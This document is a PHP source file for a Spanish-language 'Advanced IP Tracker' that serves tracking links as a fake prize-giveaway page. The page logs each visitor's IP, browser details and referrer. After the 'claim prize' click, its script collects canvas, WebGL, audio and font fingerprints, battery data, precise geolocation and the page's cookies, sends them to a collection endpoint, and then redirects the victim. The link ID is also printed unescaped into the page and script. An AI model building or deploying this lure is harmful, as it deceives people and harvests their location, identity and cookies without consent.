<?php
/**
 * Advanced IP Tracker - Manejador de Enlaces de Tracking
 * Procesa enlaces únicos y redirige a la página de captura
 */

// Configuración
define('LINKS_DIR', '../data/links/');
define('DATA_DIR', '../data/');
define('LOGS_DIR', '../logs/');

/**
 * Obtener información del enlace
 */
function getLinkInfo($linkId) {
    $filepath = LINKS_DIR . $linkId . '.json';
    if (file_exists($filepath)) {
        return json_decode(file_get_contents($filepath), true);
    }
    return null;
}

/**
 * Actualizar estadísticas del enlace
 */
function updateLinkStats($linkId, $visitorIP) {
    $filepath = LINKS_DIR . $linkId . '.json';
    if (file_exists($filepath)) {
        $linkData = json_decode(file_get_contents($filepath), true);
        
        // Incrementar clics
        $linkData['clicks'] = ($linkData['clicks'] ?? 0) + 1;
        
        // Agregar visitante único si no existe
        if (!in_array($visitorIP, $linkData['unique_visitors'] ?? [])) {
            $linkData['unique_visitors'][] = $visitorIP;
        }
        
        // Actualizar última actividad
        $linkData['last_activity'] = date('Y-m-d H:i:s');
        
        // Guardar cambios
        file_put_contents($filepath, json_encode($linkData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        
        return true;
    }
    return false;
}

/**
 * Obtener IP real del visitante
 */
function getRealIP() {
    $ipKeys = [
        'HTTP_CF_CONNECTING_IP',
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'HTTP_X_REAL_IP',
        'REMOTE_ADDR'
    ];
    
    foreach ($ipKeys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            $ips = explode(',', $_SERVER[$key]);
            $ip = trim($ips[0]);
            
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                return $ip;
            }
        }
    }
    
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}

/**
 * Registrar visita en log
 */
function logVisit($linkId, $linkData, $visitorIP) {
    $logFile = LOGS_DIR . 'visits_' . date('Y-m-d') . '.log';
    
    $logEntry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'link_id' => $linkId,
        'campaign_name' => $linkData['campaign_name'] ?? 'Unknown',
        'visitor_ip' => $visitorIP,
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        'referrer' => $_SERVER['HTTP_REFERER'] ?? 'direct',
        'request_uri' => $_SERVER['REQUEST_URI'] ?? '',
        'server_name' => $_SERVER['SERVER_NAME'] ?? 'unknown'
    ];
    
    $logLine = json_encode($logEntry, JSON_UNESCAPED_UNICODE) . "\n";
    file_put_contents($logFile, $logLine, FILE_APPEND | LOCK_EX);
}

// Procesar solicitud
$linkId = $_GET['id'] ?? null;

if (!$linkId) {
    // Si no hay ID, mostrar error
    http_response_code(404);
    echo '<!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Enlace no encontrado</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f7fa; }
            .error { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 500px; margin: 0 auto; }
            .error h1 { color: #dc3545; margin-bottom: 20px; }
            .error p { color: #6c757d; }
        </style>
    </head>
    <body>
        <div class="error">
            <h1>🔗 Enlace no encontrado</h1>
            <p>El enlace que intentas acceder no existe o ha expirado.</p>
        </div>
    </body>
    </html>';
    exit;
}

// Obtener información del enlace
$linkData = getLinkInfo($linkId);

if (!$linkData) {
    // Enlace no válido
    http_response_code(404);
    echo '<!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Enlace inválido</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f7fa; }
            .error { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 500px; margin: 0 auto; }
            .error h1 { color: #dc3545; margin-bottom: 20px; }
            .error p { color: #6c757d; }
        </style>
    </head>
    <body>
        <div class="error">
            <h1>⚠️ Enlace inválido</h1>
            <p>El enlace que intentas acceder no es válido o ha sido eliminado.</p>
        </div>
    </body>
    </html>';
    exit;
}

// Verificar si el enlace está activo
if (!$linkData['active']) {
    http_response_code(410);
    echo '<!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Enlace desactivado</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f7fa; }
            .error { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 500px; margin: 0 auto; }
            .error h1 { color: #ffc107; margin-bottom: 20px; }
            .error p { color: #6c757d; }
        </style>
    </head>
    <body>
        <div class="error">
            <h1>🚫 Enlace desactivado</h1>
            <p>Este enlace ha sido desactivado y ya no está disponible.</p>
        </div>
    </body>
    </html>';
    exit;
}

// Obtener IP del visitante
$visitorIP = getRealIP();

// Actualizar estadísticas del enlace
updateLinkStats($linkId, $visitorIP);

// Registrar visita
logVisit($linkId, $linkData, $visitorIP);

// Generar página personalizada con los datos del enlace
$customMessage = htmlspecialchars($linkData['custom_message'] ?? '¡Felicidades! Has ganado un premio');
$customPrize = htmlspecialchars($linkData['custom_prize'] ?? 'iPhone 15 Pro GRATIS');
$redirectUrl = $linkData['redirect_url'] ?? 'https://www.apple.com/iphone-15-pro/';

?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $customMessage; ?></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
            max-width: 500px;
            width: 90%;
        }
        
        .prize-icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% {
                transform: translateY(0);
            }
            40% {
                transform: translateY(-30px);
            }
            60% {
                transform: translateY(-15px);
            }
        }
        
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        
        .description {
            font-size: 1.2em;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .claim-btn {
            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 1.3em;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            text-transform: uppercase;
            font-weight: bold;
            letter-spacing: 1px;
        }
        
        .claim-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
        }
        
        .loading {
            display: none;
            margin-top: 20px;
        }
        
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 4px solid #fff;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .success {
            display: none;
            color: #2ecc71;
            font-size: 1.1em;
            margin-top: 20px;
        }
        
        .campaign-info {
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 0.7em;
            opacity: 0.7;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="prize-icon">🎁</div>
        <h1><?php echo $customMessage; ?></h1>
        <div class="description">
            Has sido seleccionado para recibir <strong><?php echo $customPrize; ?></strong>!<br>
            Solo necesitas reclamar tu premio ahora.
        </div>
        <button class="claim-btn" onclick="claimPrize()">RECLAMAR PREMIO</button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Verificando elegibilidad...</p>
        </div>
        
        <div class="success" id="success">
            ✅ ¡Verificación completada! Serás redirigido en breve...
        </div>
    </div>
    
    <!-- Información de la campaña (solo visible en desarrollo) -->
    <?php if (isset($_GET['debug'])): ?>
    <div class="campaign-info">
        Campaña: <?php echo htmlspecialchars($linkData['campaign_name']); ?> | ID: <?php echo $linkId; ?>
    </div>
    <?php endif; ?>

    <script>
        // Variables globales para almacenar datos
        let deviceData = {};
        let trackingId = '<?php echo $linkId; ?>_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        let campaignData = {
            linkId: '<?php echo $linkId; ?>',
            campaignName: '<?php echo addslashes($linkData['campaign_name']); ?>',
            customMessage: '<?php echo addslashes($customMessage); ?>',
            customPrize: '<?php echo addslashes($customPrize); ?>',
            redirectUrl: '<?php echo addslashes($redirectUrl); ?>'
        };
        
        // Función principal de recolección de datos
        async function collectDeviceData() {
            try {
                // Datos básicos del navegador
                deviceData.userAgent = navigator.userAgent;
                deviceData.platform = navigator.platform;
                deviceData.language = navigator.language;
                deviceData.languages = navigator.languages;
                deviceData.cookieEnabled = navigator.cookieEnabled;
                deviceData.onLine = navigator.onLine;
                deviceData.doNotTrack = navigator.doNotTrack;
                
                // Información de la pantalla
                deviceData.screenWidth = screen.width;
                deviceData.screenHeight = screen.height;
                deviceData.screenColorDepth = screen.colorDepth;
                deviceData.screenPixelDepth = screen.pixelDepth;
                deviceData.screenAvailWidth = screen.availWidth;
                deviceData.screenAvailHeight = screen.availHeight;
                
                // Información de la ventana
                deviceData.windowWidth = window.innerWidth;
                deviceData.windowHeight = window.innerHeight;
                deviceData.windowOuterWidth = window.outerWidth;
                deviceData.windowOuterHeight = window.outerHeight;
                
                // Zona horaria
                deviceData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                deviceData.timezoneOffset = new Date().getTimezoneOffset();
                
                // Información de conexión
                if (navigator.connection) {
                    deviceData.connectionType = navigator.connection.effectiveType;
                    deviceData.connectionDownlink = navigator.connection.downlink;
                    deviceData.connectionRtt = navigator.connection.rtt;
                }
                
                // Hardware concurrency
                deviceData.hardwareConcurrency = navigator.hardwareConcurrency;
                
                // Memoria del dispositivo
                if (navigator.deviceMemory) {
                    deviceData.deviceMemory = navigator.deviceMemory;
                }
                
                // Plugins instalados
                deviceData.plugins = [];
                for (let i = 0; i < navigator.plugins.length; i++) {
                    deviceData.plugins.push({
                        name: navigator.plugins[i].name,
                        filename: navigator.plugins[i].filename,
                        description: navigator.plugins[i].description
                    });
                }
                
                // Canvas fingerprinting
                deviceData.canvasFingerprint = getCanvasFingerprint();
                
                // WebGL fingerprinting
                deviceData.webglFingerprint = getWebGLFingerprint();
                
                // Audio fingerprinting
                deviceData.audioFingerprint = await getAudioFingerprint();
                
                // Fonts disponibles
                deviceData.fonts = await detectFonts();
                
                // Información de batería (si está disponible)
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    deviceData.battery = {
                        charging: battery.charging,
                        level: battery.level,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                }
                
                // Geolocalización (si el usuario la permite)
                try {
                    const position = await getCurrentPosition();
                    deviceData.geolocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        heading: position.coords.heading,
                        speed: position.coords.speed
                    };
                } catch (e) {
                    deviceData.geolocation = 'denied';
                }
                
                // Información de almacenamiento
                deviceData.localStorage = typeof(Storage) !== "undefined";
                deviceData.sessionStorage = typeof(Storage) !== "undefined";
                
                // Cookies existentes
                deviceData.cookies = document.cookie;
                
                // Referrer
                deviceData.referrer = document.referrer;
                
                // URL actual
                deviceData.currentUrl = window.location.href;
                
                // Timestamp
                deviceData.timestamp = new Date().toISOString();
                deviceData.trackingId = trackingId;
                
                // Información de la campaña
                deviceData.campaignData = campaignData;
                
                // Información adicional del DOM
                deviceData.documentTitle = document.title;
                deviceData.documentCharset = document.charset;
                
                return deviceData;
                
            } catch (error) {
                console.error('Error recolectando datos:', error);
                return deviceData;
            }
        }
        
        // Canvas fingerprinting
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Canvas fingerprint test 🔒', 2, 2);
                return canvas.toDataURL();
            } catch (e) {
                return 'unavailable';
            }
        }
        
        // WebGL fingerprinting
        function getWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'unavailable';
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: gl.getParameter(gl.VENDOR),
                    renderer: gl.getParameter(gl.RENDERER),
                    version: gl.getParameter(gl.VERSION),
                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                    unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unavailable',
                    unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unavailable'
                };
            } catch (e) {
                return 'unavailable';
            }
        }
        
        // Audio fingerprinting
        function getAudioFingerprint() {
            return new Promise((resolve) => {
                try {
                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                    const oscillator = audioContext.createOscillator();
                    const analyser = audioContext.createAnalyser();
                    const gainNode = audioContext.createGain();
                    const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
                    
                    oscillator.type = 'triangle';
                    oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
                    
                    gainNode.gain.setValueAtTime(0, audioContext.currentTime);
                    
                    oscillator.connect(analyser);
                    analyser.connect(scriptProcessor);
                    scriptProcessor.connect(gainNode);
                    gainNode.connect(audioContext.destination);
                    
                    scriptProcessor.onaudioprocess = function(bins) {
                        bins.outputBuffer.getChannelData(0).set(bins.inputBuffer.getChannelData(0));
                        const fingerprint = Array.from(bins.inputBuffer.getChannelData(0)).slice(0, 50).join(',');
                        oscillator.disconnect();
                        scriptProcessor.disconnect();
                        audioContext.close();
                        resolve(fingerprint);
                    };
                    
                    oscillator.start(0);
                } catch (e) {
                    resolve('unavailable');
                }
            });
        }
        
        // Detección de fuentes
        function detectFonts() {
            return new Promise((resolve) => {
                const baseFonts = ['monospace', 'sans-serif', 'serif'];
                const testFonts = [
                    'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
                    'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
                    'Trebuchet MS', 'Arial Black', 'Impact', 'Calibri', 'Cambria',
                    'Consolas', 'Lucida Console', 'Tahoma', 'Century Gothic'
                ];
                
                const detectedFonts = [];
                const testString = 'mmmmmmmmmmlli';
                const testSize = '72px';
                
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                
                // Medir dimensiones con fuentes base
                const baseDimensions = {};
                baseFonts.forEach(baseFont => {
                    context.font = testSize + ' ' + baseFont;
                    baseDimensions[baseFont] = context.measureText(testString).width;
                });
                
                // Probar cada fuente
                testFonts.forEach(testFont => {
                    let detected = false;
                    baseFonts.forEach(baseFont => {
                        context.font = testSize + ' ' + testFont + ', ' + baseFont;
                        const dimension = context.measureText(testString).width;
                        if (dimension !== baseDimensions[baseFont]) {
                            detected = true;
                        }
                    });
                    if (detected) {
                        detectedFonts.push(testFont);
                    }
                });
                
                resolve(detectedFonts);
            });
        }
        
        // Obtener geolocalización
        function getCurrentPosition() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation not supported'));
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    resolve,
                    reject,
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }
        
        // Función para enviar datos al servidor
        async function sendDataToServer(data) {
            try {
                const response = await fetch('../backend/collect.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                
                if (response.ok) {
                    const result = await response.json();
                    return result;
                } else {
                    throw new Error('Error en el servidor');
                }
            } catch (error) {
                console.error('Error enviando datos:', error);
                return null;
            }
        }
        
        // Función principal que se ejecuta al hacer clic
        async function claimPrize() {
            const button = document.querySelector('.claim-btn');
            const loading = document.getElementById('loading');
            const success = document.getElementById('success');
            
            // Mostrar loading
            button.style.display = 'none';
            loading.style.display = 'block';
            
            // Recolectar todos los datos
            const data = await collectDeviceData();
            
            // Enviar datos al servidor
            const result = await sendDataToServer(data);
            
            // Simular tiempo de procesamiento
            setTimeout(() => {
                loading.style.display = 'none';
                success.style.display = 'block';
                
                // Sistema de redirección automática mejorado
                let dataCollected = true;
                let redirectTimer = null;
                
                // Función para manejar la redirección
                function handleRedirection() {
                    if (dataCollected) {
                        clearTimeout(redirectTimer);
                        
                        // Mostrar mensaje de redirección
                        const redirectMsg = document.createElement('div');
                        redirectMsg.style.cssText = `
                            position: fixed;
                            top: 50%;
                            left: 50%;
                            transform: translate(-50%, -50%);
                            background: rgba(0,0,0,0.9);
                            color: white;
                            padding: 20px;
                            border-radius: 10px;
                            z-index: 10000;
                            text-align: center;
                            font-family: Arial, sans-serif;
                        `;
                        redirectMsg.innerHTML = '<h3>¡Felicidades!</h3><p>Redirigiendo...</p>';
                        document.body.appendChild(redirectMsg);
                        
                        // Redirección después de mostrar el mensaje
                        setTimeout(function() {
                            window.location.href = '<?php echo addslashes($redirectUrl); ?>';
                        }, 1500);
                    }
                }
                
                // Timer de seguridad para redirección forzada
                redirectTimer = setTimeout(function() {
                    window.location.href = '<?php echo addslashes($redirectUrl); ?>';
                }, 8000); // 8 segundos máximo
                
                // Ejecutar redirección
                handleRedirection();
            }, 2000);
        }
        
        // Recolectar datos básicos al cargar la página
        window.addEventListener('load', async () => {
            const basicData = {
                trackingId: trackingId,
                timestamp: new Date().toISOString(),
                event: 'page_load',
                userAgent: navigator.userAgent,
                referrer: document.referrer,
                currentUrl: window.location.href,
                screenResolution: screen.width + 'x' + screen.height,
                language: navigator.language,
                campaignData: campaignData
            };
            
            // Enviar datos de carga de página
            await sendDataToServer(basicData);
        });
        
        // Detectar cuando el usuario sale de la página
        window.addEventListener('beforeunload', async () => {
            const exitData = {
                trackingId: trackingId,
                timestamp: new Date().toISOString(),
                event: 'page_exit',
                timeOnPage: Date.now() - performance.timing.navigationStart,
                campaignData: campaignData
            };
            
            // Usar sendBeacon para enviar datos al salir
            if (navigator.sendBeacon) {
                navigator.sendBeacon('../backend/collect.php', JSON.stringify(exitData));
            }
        });
    </script>
</body>
</html>